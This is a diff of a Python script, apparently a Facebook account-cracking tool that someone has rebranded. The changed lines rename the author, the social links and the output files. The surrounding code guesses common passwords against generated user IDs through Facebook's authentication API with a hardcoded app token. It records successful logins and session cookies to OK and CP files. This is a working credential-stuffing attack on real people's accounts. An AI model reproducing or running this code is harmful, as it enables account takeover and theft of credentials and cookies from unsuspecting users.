@@ -226,26 +226,28 @@ syed =[
 
 ]
 logo=(f"""
-\033[97;1m    o           o          o   __o__   o__ __o       
-\033[96;1m   <|>         <|\        /|>    |    <|     v\    
-\033[93;1m       / \         / \\o    o// \   / \   / \     <\    
-\ 033[94;1m  /v           v\    |          |     o     |         v\  
-\ 033[95;m1 />             <\  / \        / \  __|>_  / \         <\                                                       
-\033[94;1m   o/   \o       \o/ v\  /v \o/   \o/   \o/     o/     
-\033[97;1m    <|__ __|>       |   <\/>   |     |     |__  _<|      
-\033[91;1m   /       \      / \        / \   < >    |       \     
-\033[92;1m     o/         \o    \o/        \o/    |    <o>       \o   
-                                                               
+
+\033[97;1m        o           o          o   __o__   o__ __o      
+\033[96;1m       <|>         <|\        /|>    |    <|     v\      
+\033[93;1m        / \         / \\o    o// \   / \   / \     <\     
+\033[94;1m     o/   \o       \o/ v\  /v \o/   \o/   \o/     o/     
+\033[97;1m.  <|__ __|>       |   <\/>   |     |     |__  _<|      
+\033[95;1m     /       \      / \        / \   < >    |       \     
+\033[92;1m  o/         \o    \o/        \o/    |    <o>       \o   
+ \033[96;m1 /v           v\    |          |     o     |         v\  
+ \033[98;m1 />             <\  / \        / \  __|>_  / \         <\
+
+                                              
 \033[1;37m══════════════════════════════════════════
 \033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mAMIR
-\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m AMIR
-\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mmalikamir12
+\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;3m MALIKAMIR
+\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mMALIK AMIR
 \033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
 \033[1;37m══════════════════════════════════════════\n""")
 os.system ('clear')
 
 print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!");time.sleep(0)
-#os.system("xdg-open https://www.facebook.com/usman.rajpoot.1100")
+#os.system("xdg-open https://www.facebook.com/profile.php?id=100082256173620")
 def clear ():
 	os.system('clear')
 	print (logo)
@@ -290,14 +292,14 @@ def Main():
 	if mani =='3':
 		eml()
 	if mani =='5':
-		os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100082256173620')
 		Random()
 	if mani =='1':
 		men()
 	if mani =='5':
 		c()
 	if mani =='0':
-		os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100082256173620')
 		exit('\033[1;37m(•)══════════════════════════════════════════\n\033[1;32m[•] \033[1;37mThanks For Use\n\033[1;32m[•] \033[1;37mSee You Again ')
 	else:
 		print('\n\033[1;37m(•)══════════════════════════════════════════');time.sleep(2);exit()
@@ -313,9 +315,9 @@ def c():
 	if ok =='1':
 		os.system("xdg-open https://wa.me/+923110346691");Main()
 	if ok =='2':
-		os.system("xdg-open https://www.facebook.com/profile.php?id=100082256173620 ");Main()
+		os.system("xdg-open https://www.facebook.com/profile.php?id=100082256173620");Main()
 	if ok =='3':
-		print("\033[0;97m USER NAME :\033[0;92m  amir._.080 ")
+		print("\033[0;97m USER NAME :\033[0;92m  Arain._.080 ")
 		input(" PRESS ENTER TO BACK ");Main()
 	if ok =='0':
 		Main()
@@ -358,7 +360,7 @@ def R():
 		    uid = kode+guru
 		    pwx = [guru,uid,'khankhan123','khan123','khan12345','khan123456','i love you','bengladesh','khanbaba','khankhan']
 		    yaari.submit(rcrack1,uid,pwx,tl)
-    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/MANI-OK.txt\n[•] CP IDS SAVE : /sdcard/MANI-CP.txt');input('[•] Press Enter To Back Menu ');Main()
+    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/AMIR-OK.txt\n[•] CP IDS SAVE : /sdcard/AMIR-CP.txt');input('[•] Press Enter To Back Menu ');Main()
    
  
  
@@ -388,7 +390,7 @@ def eml():
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
-    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/MANI-OK.txt\n[•] CP IDS SAVE : /sdcard/MANI-CP.txt');input('[•] Press Enter To Back Menu ');Main()
+    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/AMIR-OK.txt\n[•] CP IDS SAVE : /sdcard/AMIR-CP.txt');input('[•] Press Enter To Back Menu ');Main()
    
 
 
@@ -449,8 +451,8 @@ class Random:
                 print('\033[1;37m(•)══════════════════════════════════════════')
                 for user in self.id:
                     coeg.submit(self.api, user, listpass.split(","))
-            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> MANI-OK.txt" % (G))
-            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> MANI-CP.txt" % (Y))
+            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> AMIR-OK.txt" % (G))
+            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> AMIR-CP.txt" % (Y))
             print('\n\033[1;37m(•)══════════════════════════════════════════')
             input("\n\033[0;92m[√]\033[0;97m CRACK COMPLETE...\n\033[0;92m[~] \033[0;97mPRESS ENTER TO BACK MAIN MENU");Main()
         except Exception as e:
@@ -478,7 +480,7 @@ class Random:
                     pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                 headers=headers)
             if "www.facebook.com" in response.json()["error_msg"]:
-                print("\r \033[0;92m[KHAN-OK] %s √ %s\033[0;97m         " % (uid, pw))
+                print("\r \033[0;92m[AMIR-OK] %s √ %s\033[0;97m         " % (uid, pw))
                 self.cp.append("%s√%s" % (uid, pw))
                 open("AMIR-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                 break
@@ -536,17 +538,17 @@ def rcrack1(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\33[1;92m[KHAN-OK] '+uid+' √ '+ps+'\33[0;97m')
+				print('\33[1;92m[AMIR-OK] '+uid+' √ '+ps+'\33[0;97m')
 				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))
 				
-				open('KHAN-OK.txt', 'a').write(uid+' √ '+ps+'\n')
+				open('AMIR-OK.txt', 'a').write(uid+' √ '+ps+'\n')
 				oks.append(uid);
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
-				print('\33[1;91m[KHAN-CP] '+uid+' • '+ps+'\33[0;97m')
-				open('KHAN-CP.txt', 'a').write(uid+' • '+ps+'\n')
+				print('\33[1;91m[AMIR-CP] '+uid+' • '+ps+'\33[0;97m')
+				open('AMIR-CP.txt', 'a').write(uid+' • '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -631,15 +633,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m[USMAN-OK] %s √ %s'%(ids,pas))
-                                open(f'/sdcard/MANI-OK.txt', 'a').write(ids+' √ '+pas+'\n')
+                                print(f'\r\r\033[1;32m[AMIR-OK] %s √ %s'%(ids,pas))
+                                open(f'/sdcard/AMIR-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in cp:
-                                        print(f'\r\r\033[1;37m[USMAN-CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/MANI-CP.txt', 'a').write(ids+' • '+pas+'\n')
+                                        print(f'\r\r\033[1;37m[AMIR-CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AMIR-CP.txt', 'a').write(ids+' • '+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -657,5 +659,6 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
 
 
-()
+
+Main()
 
